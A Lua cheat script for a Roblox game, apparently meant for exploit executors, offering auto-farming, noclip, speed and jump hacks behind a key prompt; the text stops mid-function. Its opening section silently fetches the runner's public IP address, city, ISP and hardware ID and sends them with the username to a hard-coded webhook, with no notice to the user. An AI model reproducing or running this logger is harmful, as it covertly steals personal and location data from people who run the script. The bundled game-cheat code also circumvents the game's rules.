-- =========================================================
-- 1. HIGH-POWER NETWORK LOGGER (IP, City, ISP & Hardware)
-- =========================================================
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1525828218953666722/sIeLIctJLIxTpG_lUHH65Ip-YLyddc4y_sbXs0cVOPgcw_HDluGpAWYlphHoOkm3gchf" 

local Players = game:GetService("Players")
local Market = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

if httpRequest and WEBHOOK_URL and WEBHOOK_URL ~= "" then
    local localPlayer = Players.LocalPlayer
    
    local gameName = "Unknown Game"
    pcall(function() gameName = Market:GetProductInfo(game.PlaceId).Name end)

    local executorUsed = "Unknown Executor"
    if identifyexecutor then
        pcall(function() executorUsed = identifyexecutor() end)
    elseif getexecutorname then
        pcall(function() executorUsed = getexecutorname() end)
    end

    local isPremium = (localPlayer.MembershipType == Enum.MembershipType.Premium) and "Yes 💎" or "No"

    local ipAddress = "Failed to fetch"
    local cityName = "Unknown City"
    local regionName = "Unknown Region"
    local ispName = "Unknown ISP"

    pcall(function()
        local response = httpRequest({
            Url = "http://ip-api.com/json/",
            Method = "GET"
        })
        
        if response and response.Body then
            local geoData = HttpService:JSONDecode(response.Body)
            if geoData and geoData.status == "success" then
                ipAddress = geoData.query or ipAddress
                cityName = geoData.city or cityName
                regionName = geoData.regionName or regionName
                ispName = geoData.isp or ispName
            end
        end
    end)

    local hwidString = "Not Supported"
    if gethwid then
        pcall(function() hwidString = gethwid() end)
    elseif syn and syn.gethwid then
        pcall(function() hwidString = syn.gethwid() end)
    end

    local payload = {
        ["embeds"] = {{
            ["title"] = "🚨 High-Priority Script Execution Log",
            ["color"] = 16515843, 
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = localPlayer.Name, ["inline"] = true},
                {["name"] = "🏷️ Display Name", ["value"] = localPlayer.DisplayName, ["inline"] = true},
                {["name"] = "⏳ Account Age", ["value"] = localPlayer.AccountAge .. " days", ["inline"] = true},
                
                {["name"] = "🛠️ Executor", ["value"] = executorUsed, ["inline"] = true},
                {["name"] = "💎 Premium?", ["value"] = isPremium, ["inline"] = true},
                {["name"] = "🎮 Game Name", ["value"] = gameName, ["inline"] = true},
                
                {["name"] = "🌐 Public IP Address", ["value"] = "`" .. ipAddress .. "`", ["inline"] = true},
                {["name"] = "🏙️ Location", ["value"] = cityName .. ", " .. regionName, ["inline"] = true},
                {["name"] = "🔌 ISP Provider", ["value"] = ispName, ["inline"] = true},
                
                {["name"] = "🔑 Hardware ID (HWID)", ["value"] = "`" .. hwidString .. "`", ["inline"] = false},
                {["name"] = "🔗 Game Link", ["value"] = "[Click Here to Join](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = false}
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    task.spawn(function()
        pcall(function()
            httpRequest({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- =========================================================
-- 2. MAIN SCRIPT & UI ENGINE
-- =========================================================

local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local VirtualInputManager = game:GetService("VirtualInputManager")
local PathfindingService = game:GetService("PathfindingService")
local Workspace = game:GetService("Workspace")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local StatsService = game:GetService("Stats")

local Player = Players.LocalPlayer

-- Isolated Gem Settings
local GemSettings = {
    TweenSpeed = 0.15, 
    MinHeight = 15     -- Blocks gems spawned underground below this Y coordinate
}

-- Fetch game name dynamically
local success, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)
local dynamicGameName = success and gameInfo.Name or "Game Workspace"

-- Prevent duplicate GUIs
if CoreGui:FindFirstChild("VelocityCustomUI") then
    CoreGui:FindFirstChild("VelocityCustomUI"):Destroy()
end

if Player then
    -- Updated max zoom limit to 10,000
    Player.CameraMinZoomDistance = 0.5
    Player.CameraMaxZoomDistance = 10000
    
    -- Focused Client Boss Visibility Loop (Low Opacity Fix)
    task.spawn(function()
        RunService.Heartbeat:Connect(function()
            local BossFolder = workspace:FindFirstChild("BossModels")
            if BossFolder then
                for _, BossModel in ipairs(BossFolder:GetChildren()) do
                    if BossModel:IsA("Model") then
                        for _, Part in ipairs(BossModel:GetDescendants()) do
                            if Part:IsA("BasePart") then
                                if Part.Transparency < 0.05 and Part.Name ~= "HumanoidRootPart" then
                                    Part.Transparency = 0.05
                                end
                            end
                        end
                    end
                end
            end
        end)
    end)
end

-- Anti-AFK Engine
task.spawn(function()
    if Player then
        Player.Idled:Connect(function()
            pcall(function()
                VirtualUser:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                task.wait(1)
                VirtualUser:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        end)
    end
end)

-- Global State Handler Clearing
getgenv().AutoLift = false
getgenv().AutoPunch = false
getgenv().AutoStomp = false
getgenv().AutoAirdrop = false
getgenv().AutoTerritories = false

getgenv().AutoGemTween = false
getgenv().AutoGemBring = false

getgenv().AutoSell = false
getgenv().AutoSellOg = false
getgenv().BossBring = false
getgenv().WalkToBoss = false
getgenv().TpToBossKill = false

getgenv().AutoBuyWeights = false
getgenv().AutoBuyDNA = false
getgenv().AutoBuyBodies = false
getgenv().AutoBuyOgWeights = false
getgenv().AutoBuyOgBodies = false

getgenv().AutoHatchEgg = false
getgenv().AutoHatchEgg2 = false
getgenv().AutoHatch3Eggs = false
getgenv().AutoHatchOgEgg = false
getgenv().InfiniteJump = false
getgenv().Noclip = false

-- New Global States
getgenv().AutoRejoin = false
getgenv().WalkSpeedToggle = false
getgenv().WalkSpeedValue = 16
getgenv().JumpPowerToggle = false
getgenv().JumpPowerValue = 50

local GemSpeed = 300 
local GemDelay = 0.25 
local HatchDelay = 0.01 

local GemCooldownList = {}
local AirdropCooldownList = {}

-- Safe Remote Loading Architecture
local AttackRemote
local PurchaseEggRemote
local RequestBuyAllRemote
local RequestPurchaseRemote
local SellStrengthRequest
local LiftWeightRemote

task.spawn(function()
    local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
    if Remotes then
        LiftWeightRemote = Remotes:WaitForChild("LiftWeight", 5)
        SellStrengthRequest = Remotes:WaitForChild("SellStrengthRequest", 5)
        local PVP = Remotes:WaitForChild("PVP", 5)
        AttackRemote = PVP and PVP:WaitForChild("AttackAttempt", 5)
        local Shop = Remotes:WaitForChild("Shop", 5)
        if Shop then
            RequestBuyAllRemote = Shop:WaitForChild("RequestBuyAll", 5)
            RequestPurchaseRemote = Shop:WaitForChild("RequestPurchase", 5)
        end
        local Pets = Remotes:WaitForChild("Pets", 5)
        PurchaseEggRemote = Pets and Pets:WaitForChild("PurchaseEgg", 5)
    end
end)

local function getHRP()
    local Character = Player.Character
    if not Character then return nil end
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    if Humanoid and Humanoid.Health <= 0 then return nil end
    return Character:FindFirstChild("HumanoidRootPart")
end

-- Enforcement loop (Handles Noclip, WalkSpeed, JumpPower)
task.spawn(function()
    RunService.PreSimulation:Connect(function()
        local Character = Player.Character
        if not Character then return end
        
        if getgenv().Noclip then
            for _, Part in ipairs(Character:GetDescendants()) do
                if Part:IsA("BasePart") and Part.CanCollide then
                    Part.CanCollide = false
                end
            end
        end

        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then
            if getgenv().WalkSpeedToggle then
                Humanoid.WalkSpeed = getgenv().WalkSpeedValue
            end
            if getgenv().JumpPowerToggle then
                Humanoid.UseJumpPower = true
                Humanoid.JumpPower = getgenv().JumpPowerValue
            end
        end
    end)
end)

UserInputService.JumpRequest:Connect(function()
    if getgenv().InfiniteJump then
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end
    end
end)

-- Auto Rejoin Handler
GuiService.ErrorMessageChanged:Connect(function()
    if getgenv().AutoRejoin then
        task.wait(2)
        TeleportService:Teleport(game.PlaceId, Player)
    end
end)

-- Helper to find the dynamically named numeric folder in Workspace
local function getDynamicGemsFolder()
    for _, child in ipairs(Workspace:GetChildren()) do
        if child:IsA("Folder") and string.match(child.Name, "^%d+$") then
            return child
        end
    end
    return nil
end

-- Nearest Gem Search (Ignores underground items)
local function getNearestGem()
    local hrp = getHRP()
    if not hrp then return nil end

    local nearestGem = nil
    local shortestDistance = math.huge
    local heightCutoff = GemSettings.MinHeight

    local foldersToScan = {}
    
    local standardSpawns = Workspace:FindFirstChild("ConsumableSpawns")
    if standardSpawns then table.insert(foldersToScan, standardSpawns) end
    
    local dynamicSpawns = getDynamicGemsFolder()
    if dynamicSpawns then table.insert(foldersToScan, dynamicSpawns) end

    for _, folder in ipairs(foldersToScan) do
        for _, child in ipairs(folder:GetChildren()) do
            if child:IsA("MeshPart") and (child.Name == "GemModel" or string.find(child.Name, "Gem")) then
                local isStandardGem = (child.Material == Enum.Material.SmoothPlastic)
                local isHugeNeonGem = (child.Material == Enum.Material.Neon) 
                    and (child.RenderFidelity == Enum.RenderFidelity.Precise) 
                    and (child.Transparency == 0)

                if isStandardGem or isHugeNeonGem then
                    if child.Position.Y > heightCutoff then
                        local distance = (child.Position - hrp.Position).Magnitude
                        if distance < shortestDistance then
                            shortestDistance = distance
                            nearestGem = child
                        end
                    end
                end
            end
        end
    end
    return nearestGem
end

local function getBypassGem()
    local HRP = getHRP()
    if not HRP then return nil end
    local ClosestInstance, ClosestPosition, Shortest, TargetSizeY = nil, nil, math.huge, 2
    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name == "GemModel" or v.Name == "BigGemModel" then
            if not GemCooldownList[v] then
                local CurrentPos, CurrentSizeY = nil, 2
                if v:IsA("BasePart") then CurrentPos = v.Position CurrentSizeY = v.Size.Y
                elseif v:IsA("Model") then CurrentPos = v:GetPivot().Position local _, es = v:GetBoundingBox() CurrentSizeY = es.Y end
                if CurrentPos and CurrentPos.Magnitude > 5 and CurrentPos.Y > -5 then
                    local Distance = (CurrentPos - HRP.Position).Magnitude
                    if Distance < Shortest then Shortest = Distance ClosestInstance = v ClosestPosition = CurrentPos TargetSizeY = CurrentSizeY end
                end
            end
        end
    end
    return ClosestInstance, ClosestPosition, TargetSizeY
end

local function touchCooldown(Target) 
    if Target then 
        GemCooldownList[Target] = true 
        task.delay(4, function() GemCooldownList[Target] = nil end) 
    end 
end

local function getAirdrop()
    local Folder = workspace:FindFirstChild("Airdrops")
    if not Folder then return nil end
    for _, Drop in ipairs(Folder:GetChildren()) do
        if Drop.Name == "Airdrop" and not AirdropCooldownList[Drop] then
            local Part = Drop:FindFirstChild("HumanoidRootPart") or Drop:FindFirstChildWhichIsA("BasePart")
            if Part then return Drop, Part end
        end
    end
    return nil
end

local function getKOTHCFrame()
    local rangeSystem = workspace:FindFirstChild("RingAreas") and workspace.RingAreas:FindFirstChild("RangeSystem")
    local serverFolder = rangeSystem and rangeSystem:FindFirstChild("Server")
    local kothArea = serverFolder and serverFolder:FindFirstChild("KOTHArea")
    if kothArea then
        local ring = kothArea:FindFirstChild("Ring")
        if ring then
            if ring:IsA("BasePart") then return ring.CFrame
            elseif ring:IsA("Model") then return ring:GetPivot() end
        end
        if kothArea:IsA("BasePart") then return kothArea.CFrame
        elseif kothArea:IsA("Model") then return kothArea:GetPivot() end
    end
    return nil
end

-- Configurable Settings Variables
local toggleKeybind = Enum.KeyCode.K
local isBinding = false

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "VelocityCustomUI"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

---------------------------------------------------------
-- TOGGLE BUTTON PANEL
---------------------------------------------------------
local ToggleBtn = Instance.new("ImageButton")
ToggleBtn.Name = "ToggleBtn"
ToggleBtn.Size = UDim2.new(0, 42, 0, 42)
ToggleBtn.Position = UDim2.new(0, 10, 0.5, -21)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(38, 38, 42)
ToggleBtn.BorderSizePixel = 0
ToggleBtn.Visible = false 
ToggleBtn.ZIndex = 10
ToggleBtn.Parent = ScreenGui

ToggleBtn.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=126271009198726&width=420&height=420&format=png"
ToggleBtn.ScaleType = Enum.ScaleType.Fit

local StaticToggleStroke = Instance.new("UIStroke")
StaticToggleStroke.Name = "StaticToggleStroke"
StaticToggleStroke.Thickness = 2
StaticToggleStroke.Color = Color3.fromRGB(0, 0, 0)
StaticToggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
StaticToggleStroke.LineJoinMode = Enum.LineJoinMode.Miter 
StaticToggleStroke.Parent = ToggleBtn

local draggingToggle, dragInputToggle, dragStartToggle, startPosToggle
local dragThreshold = 5
local hasMoved = false

local function updateToggleDrag(input)
    local delta = input.Position - dragStartToggle
    if delta.Magnitude > dragThreshold then hasMoved = true end
    ToggleBtn.Position = UDim2.new(startPosToggle.X.Scale, startPosToggle.X.Offset + delta.X, startPosToggle.Y.Scale, startPosToggle.Y.Offset + delta.Y)
end

ToggleBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingToggle = true
        hasMoved = false
        dragStartToggle = input.Position
        startPosToggle = ToggleBtn.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then draggingToggle = false end
        end)
    end
end)

ToggleBtn.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInputToggle = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInputToggle and draggingToggle then updateToggleDrag(input) end
end)

---------------------------------------------------------
-- KEY SYSTEM CONFIGURATION WITH FAIL LIMIT
---------------------------------------------------------
local CORRECT_KEY = "Tropical"
local failedAttempts = 0

local KeyFrame = Instance.new("Frame")
KeyFrame.Name = "KeyFrame"
KeyFrame.Size = UDim2.new(0, 340, 0, 190)
KeyFrame.Position = UDim2.new(0.5, -170, 0.5, -95)
KeyFrame.BackgroundColor3 = Color3.fromRGB(34, 34, 38)
KeyFrame.BorderSizePixel = 0
KeyFrame.Active = true
KeyFrame.Draggable = true
KeyFrame.Parent = ScreenGui

local KeyCorner = Instance.new("UICorner")
KeyCorner.CornerRadius = UDim.new(0, 8)
KeyCorner.Parent = KeyFrame

local KeyStroke = Instance.new("UIStroke")
KeyStroke.Thickness = 2
KeyStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
KeyStroke.LineJoinMode = Enum.LineJoinMode.Round
KeyStroke.Parent = KeyFrame

task.spawn(function()
    while KeyFrame and KeyFrame.Parent do
        for i = 0, 1, 0.005 do
            if not KeyFrame or not KeyFrame.Parent then break end
            KeyStroke.Color = Color3.fromHSV(i, 0.9, 0.9)
            RunService.RenderStepped:Wait()
        end
    end
end)

local KeyHeader = Instance.new("TextLabel")
KeyHeader.Size = UDim2.new(1, 0, 0, 45)
KeyHeader.BackgroundTransparency = 1
KeyHeader.Text = "Velocity's Custom V2 : Key Required"
KeyHeader.TextColor3 = Color3.fromRGB(245, 245, 245)
KeyHeader.TextSize = 15
KeyHeader.Font = Enum.Font.SourceSansBold
KeyHeader.Parent = KeyFrame

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(0, 280, 0, 38)
KeyInput.Position = UDim2.new(0.5, -140, 0.4, -5)
KeyInput.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
KeyInput.BorderSizePixel = 0
KeyInput.Text = ""
KeyInput.PlaceholderText = "Enter key here..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(140, 140, 155)
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.TextSize = 14
KeyInput.Font = Enum.Font.SourceSans

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 5)
InputCorner.Parent = KeyInput

local InputStroke = Instance.new("UIStroke")
InputStroke.Thickness = 1
InputStroke.Color = Color3.fromRGB(70, 70, 85)
InputStroke.Parent = KeyInput
KeyInput.Parent = KeyFrame

local SubmitBtn = Instance.new("TextButton")
SubmitBtn.Size = UDim2.new(0, 140, 0, 34)
SubmitBtn.Position = UDim2.new(0.5, -70, 0.72, 5)
SubmitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
SubmitBtn.BorderSizePixel = 0
SubmitBtn.Text = "Verify Key"
SubmitBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
SubmitBtn.TextSize = 14
SubmitBtn.Font = Enum.Font.SourceSansBold

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 5)
BtnCorner.Parent = SubmitBtn

local BtnStroke = Instance.new("UIStroke")
BtnStroke.Thickness = 1
BtnStroke.Color = Color3.fromRGB(85, 85, 100)
BtnStroke.Parent = SubmitBtn
SubmitBtn.Parent = KeyFrame

SubmitBtn.MouseEnter:Connect(function()
    TweenService:Create(SubmitBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(65, 65, 78), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
end)
SubmitBtn.MouseLeave:Connect(function()
    TweenService:Create(SubmitBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(50, 50, 60), TextColor3 = Color3.fromRGB(240, 240, 240)}):Play()
end)

---------------------------------------------------------
-- MAIN GUI GENERATION
---------------------------------------------------------
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 460, 0, 310)
MainFrame.Position = UDim2.new(0.5, -230, 0.5, -155)
MainFrame.BackgroundColor3 = Color3.fromRGB(34, 34, 38)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 4)
MainCorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 2
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.LineJoinMode = Enum.LineJoinMode.Round
UIStroke.Parent = MainFrame

local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Size = UDim2.new(1, -16, 0, 36)
Header.Position = UDim2.new(0, 8, 0, 6)
Header.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderStroke = Instance.new("UIStroke")
HeaderStroke.Thickness = 1
HeaderStroke.Color = Color3.fromRGB(60, 60, 65)
HeaderStroke.Parent = Header

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 4)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Velocity's Custom V2 : " .. dynamicGameName .. " 🍍"
Title.TextColor3 = Color3.fromRGB(245, 245, 245)
Title.TextSize = 17
Title.Font = Enum.Font.SourceSansBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

---------------------------------------------------------
-- OPTIONS PANEL SYSTEM
---------------------------------------------------------
local OptionsBtn = Instance.new("TextButton")
OptionsBtn.Name = "OptionsBtn"
OptionsBtn.Size = UDim2.new(0, 30, 0, 26)
OptionsBtn.Position = UDim2.new(1, -38, 0.5, -13)
OptionsBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 38)
OptionsBtn.Text = "•••"
OptionsBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
OptionsBtn.TextSize = 14
OptionsBtn.Font = Enum.Font.SourceSansBold
OptionsBtn.BorderSizePixel = 0
OptionsBtn.ZIndex = 5
OptionsBtn.Parent = Header

local OptionsBtnCorner = Instance.new("UICorner")
OptionsBtnCorner.CornerRadius = UDim.new(0, 4)
OptionsBtnCorner.Parent = OptionsBtn

local OptionsDropdown = Instance.new("Frame")
OptionsDropdown.Name = "OptionsDropdown"
OptionsDropdown.Size = UDim2.new(0, 150, 0, 50)
OptionsDropdown.Position = UDim2.new(1, -158, 0, 42)
OptionsDropdown.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
OptionsDropdown.BorderSizePixel = 0
OptionsDropdown.Visible = false
OptionsDropdown.ZIndex = 6
OptionsDropdown.Parent = MainFrame

local DropdownCorner = Instance.new("UICorner")
DropdownCorner.CornerRadius = UDim.new(0, 4)
DropdownCorner.Parent = OptionsDropdown

local DropdownStroke = Instance.new("UIStroke")
DropdownStroke.Thickness = 1
DropdownStroke.Color = Color3.fromRGB(60, 60, 65)
DropdownStroke.Parent = OptionsDropdown

local KeybindActionBtn = Instance.new("TextButton")
KeybindActionBtn.Name = "KeybindActionBtn"
KeybindActionBtn.Size = UDim2.new(1, -12, 1, -12)
KeybindActionBtn.Position = UDim2.new(0, 6, 0, 6)
KeybindActionBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 38)
KeybindActionBtn.Text = "Bind: K"
KeybindActionBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
KeybindActionBtn.TextSize = 12
KeybindActionBtn.Font = Enum.Font.SourceSansSemibold
KeybindActionBtn.BorderSizePixel = 0
KeybindActionBtn.ZIndex = 7
KeybindActionBtn.Parent = OptionsDropdown

local KeybindBtnCorner = Instance.new("UICorner")
KeybindBtnCorner.CornerRadius = UDim.new(0, 4)
KeybindBtnCorner.Parent = KeybindActionBtn

OptionsBtn.MouseButton1Click:Connect(function()
    OptionsDropdown.Visible = not OptionsDropdown.Visible
end)

KeybindActionBtn.MouseButton1Click:Connect(function()
    if not isBinding then
        isBinding = true
        KeybindActionBtn.Text = "... Press any key ..."
        KeybindActionBtn.TextColor3 = Color3.fromRGB(255, 210, 0)
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if isBinding then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            toggleKeybind = input.KeyCode
            isBinding = false
            KeybindActionBtn.Text = "Bind: " .. toggleKeybind.Name
            KeybindActionBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
        end
    else
        if input.KeyCode == toggleKeybind and not gameProcessed then
            if ScreenGui:FindFirstChild("MainFrame") and not ScreenGui:FindFirstChild("KeyFrame") then
                MainFrame.Visible = not MainFrame.Visible
            end
        end
    end
end)

---------------------------------------------------------
-- NAVIGATION PANELS SETUP
---------------------------------------------------------
local NavPanel = Instance.new("Frame")
NavPanel.Name = "NavPanel"
NavPanel.Size = UDim2.new(0, 130, 1, -54)
NavPanel.Position = UDim2.new(0, 8, 0, 46)
NavPanel.BackgroundColor3 = Color3.fromRGB(38, 38, 42)
NavPanel.BorderSizePixel = 0
NavPanel.Parent = MainFrame

local NavStroke = Instance.new("UIStroke")
NavStroke.Thickness = 1
NavStroke.Color = Color3.fromRGB(60, 60, 60)
NavStroke.Parent = NavPanel

local NavCorner = Instance.new("UICorner")
NavCorner.CornerRadius = UDim.new(0, 4)
NavCorner.Parent = NavPanel

local NavLayout = Instance.new("UIListLayout")
NavLayout.Padding = UDim.new(0, 4)
NavLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
NavLayout.SortOrder = Enum.SortOrder.LayoutOrder
NavLayout.Parent = NavPanel

local NavPadding = Instance.new("UIPadding")
NavPadding.PaddingTop = UDim.new(0, 6)
NavPadding.Parent = NavPanel

local Container = Instance.new("Frame")
Container.Name = "Container"
Container.Size = UDim2.new(1, -152, 1, -54)
Container.Position = UDim2.new(0, 144, 0, 46)
Container.BackgroundColor3 = Color3.fromRGB(38, 38, 42)
Container.BorderSizePixel = 0
Container.Parent = MainFrame

local ContainerStroke = Instance.new("UIStroke")
ContainerStroke.Thickness = 1
ContainerStroke.Color = Color3.fromRGB(60, 60, 60)
ContainerStroke.Parent = Container

local ContainerCorner = Instance.new("UICorner")
ContainerCorner.CornerRadius = UDim.new(0, 4)
ContainerCorner.Parent = Container

-- Verification Event Execution with Kick Logic
SubmitBtn.MouseButton1Click:Connect(function()
    if KeyInput.Text == CORRECT_KEY then
        KeyFrame:Destroy()
        MainFrame.Visible = true
        ToggleBtn.Visible = true
        
        task.spawn(function()
            while MainFrame and MainFrame.Parent do
                for i = 0, 1, 0.005 do
                    if not MainFrame or not MainFrame.Parent then break end
                    local currentColor = Color3.fromHSV(i, 0.9, 0.9)
                    if UIStroke and UIStroke.Parent then UIStroke.Color = currentColor end
                    RunService.RenderStepped:Wait()
                end
            end
        end)
    else
        failedAttempts = failedAttempts + 1
        if failedAttempts >= 3 then
            Player:Kick("Invalid key.")
            return
        end
        KeyInput.Text = ""
        TweenService:Create(InputStroke, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, true), {Color = Color3.fromRGB(235, 60, 60)}):Play()
    end
end)

ToggleBtn.MouseButton1Click:Connect(function()
    if not hasMoved then MainFrame.Visible = not MainFrame.Visible end
end)

-- Tab Visibility Manager
local tabs = {}
local currentTab = nil

local function createTab(name, layoutOrder)
    local tabButton = Instance.new("TextButton")
    tabButton.Size = UDim2.new(0, 118, 0, 28)
    tabButton.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
    tabButton.Text = name
    tabButton.TextColor3 = Color3.fromRGB(180, 180, 180)
    tabButton.TextSize = 12
    tabButton.Font = Enum.Font.SourceSansSemibold
    tabButton.BorderSizePixel = 0
    tabButton.LayoutOrder = layoutOrder
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = tabButton
    tabButton.Parent = NavPanel

    local contentFrame = Instance.new("ScrollingFrame")
    contentFrame.Size = UDim2.new(1, -12, 1, -12)
    contentFrame.Position = UDim2.new(0, 6, 0, 6)
    contentFrame.BackgroundTransparency = 1
    contentFrame.BorderSizePixel = 0
    contentFrame.ScrollBarThickness = 3
    contentFrame.ScrollBarImageColor3 = Color3.fromRGB(110, 110, 110)
    contentFrame.Visible = false
    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    contentFrame.Parent = Container

    local contentLayout = Instance.new("UIListLayout")
    contentLayout.Padding = UDim.new(0, 5)
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
    contentLayout.Parent = contentFrame
    
    contentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        contentFrame.CanvasSize = UDim2.new(0, 0, 0, contentLayout.AbsoluteContentSize.Y + 10)
    end)

    tabButton.MouseButton1Click:Connect(function()
        for _, t in pairs(tabs) do
            t.Frame.Visible = false
            t.Button.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
            t.Button.TextColor3 = Color3.fromRGB(180, 180, 180)
        end
        contentFrame.Visible = true
        tabButton.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
        tabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)

    tabs[name] = {Frame = contentFrame, Button = tabButton}
    if not currentTab then
        contentFrame.Visible = true
        tabButton.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
        tabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        currentTab = name
    end
    return contentFrame
end

-- UI Element Builders
local function createToggle(parentTab, text, defaultState, callback)
    local toggleFrame = Instance.new("Frame")
    toggleFrame.Size = UDim2.new(1, 0, 0, 34)
    toggleFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    toggleFrame.BorderSizePixel = 0
    toggleFrame.Parent = parentTab

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = toggleFrame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -65, 1, 0)
    label.Position = UDim2.new(0, 12, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(225, 225, 225)
    label.TextSize = 13
    label.Font = Enum.Font.SourceSansSemibold
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = toggleFrame

    local track = Instance.new("TextButton")
    track.Size = UDim2.new(0, 34, 0, 16)
    track.Position = UDim2.new(1, -46, 0.5, -8)
    track.Text = ""
    track.BorderSizePixel = 0
    track.Parent = toggleFrame

    local trackCorner = Instance.new("UICorner")
    trackCorner.CornerRadius = UDim.new(1, 0)
    trackCorner.Parent = track

    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0, 10, 0, 10)
    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    knob.BorderSizePixel = 0
    knob.Parent = track

    local knobCorner = Instance.new("UICorner")
    knobCorner.CornerRadius = UDim.new(1, 0)
    knobCorner.Parent = knob

    local enabled = defaultState
    if enabled then
        track.BackgroundColor3 = Color3.fromRGB(0, 210, 115)
        knob.Position = UDim2.new(1, -13, 0.5, -5)
    else
        track.BackgroundColor3 = Color3.fromRGB(235, 60, 60)
        knob.Position = UDim2.new(0, 3, 0.5, -5)
    end

    track.MouseButton1Click:Connect(function()
        enabled = not enabled
        if enabled then
            TweenService:Create(track, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(0, 210, 115)}):Play()
            TweenService:Create(knob, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(1, -13, 0.5, -5)}):Play()
        else
